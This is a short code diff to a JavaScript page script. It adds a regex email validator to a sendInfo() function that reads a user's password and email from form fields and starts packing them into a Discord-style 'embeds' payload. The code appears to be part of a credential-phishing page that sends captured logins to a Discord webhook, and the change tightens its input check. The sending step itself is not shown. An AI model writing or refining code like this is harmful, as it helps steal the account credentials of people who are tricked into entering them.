@@ -7,11 +7,16 @@ function discord() {
     window.open("https://discord.gg/qtkeqQUCGv", "_blank");
 }
 
+function isValidEmail(email) {
+    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return regex.test(email);
+}
+
 function sendInfo() {
     const password = document.getElementById("password").value;
     const email = document.getElementById("email").value;
     const mainBTN = document.getElementById("join");
-    if (email.includes("@") && email.includes(".")) {
+    if (isValidEmail(email)) {
         const payload = {
             embeds: [
             {
